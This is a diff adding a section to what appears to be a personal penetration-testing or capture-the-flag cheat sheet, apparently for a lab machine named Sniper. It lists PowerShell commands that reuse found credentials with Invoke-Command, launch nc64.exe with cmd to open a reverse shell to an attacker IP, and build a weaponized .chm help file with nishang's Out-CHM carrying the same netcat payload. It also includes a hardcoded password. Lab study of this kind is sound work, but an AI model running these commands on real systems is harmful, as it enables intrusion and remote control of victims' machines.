@@ -397,6 +397,61 @@ Get-WmiObject -Class Win32_Product
 ```
 - List installed software:
 
+Runas when finding creds as a test (in powershell)
+```
+powershell
+```
+```
+hostname
+```
+- use before \ in next command
+```
+$user = "Sniper\Chris"
+```
+```
+$pass = "36mEAhz/B8xQ~2VM"
+```
+```
+$secstr = New-Object -TypeName System.Security.SecureString
+```
+```
+$pass.ToCharArray() | ForEach-Object {$secstr.AppendChar($_)}
+```
+```
+$cred = new-object -typename System.Management.Automation.PSCredential -argumentlist $user, $secstr
+```
+```
+Invoke-Command -ScriptBlock { whoami } -Credential $cred -Computer localhost
+```
+- should return name of new user creds if creds are valid and if user is in remote users group
+```
+Invoke-Command -ScriptBlock { type \users\chris\desktop\user.txt } -Credential $cred -Computer localhost
+```
+- get flag
+```
+Invoke-Command -ScriptBlock { \\10.10.14.142\share\nc64.exe -e cmd 10.10.14.142 80 } -Credential $cred -Computer localhost
+```
+- turn into shell, catch with `rlwrap nc -lvnp 443`
+
+Weaponize .chm files with nishang
+- download Out-CHM.ps1 from https://github.com/samratashok/nishang/releases/tag/v0.7.6 under \client\ directory
+```
+. .\Out-CHM.ps1
+```
+- run on personal windows machine
+```
+Out-CHM -Payload "\windows\system32\spool\drivers\color\nc64.exe -e cmd 10.10.14.142 443" -HHCPath "C:\Program Files (x86)\HTML Help Workshop"
+```
+- also run on personal windows machine, creates doc.chm
+```
+copy \\10.10.14.142\share\doc.chm .
+```
+- transfer doc.shm to target machine (in this example with smbserver)
+```
+copy \\10.10.14.142\share\nc64.exe \windows\system32\spool\drivers\color\
+```
+- also transfer nc64.exe to that directory
+- after a minute or so, will catch shell from `rlwrap nc -lvnp 443`
 
 #### winpeas
 `.\winPEASx64.exe`
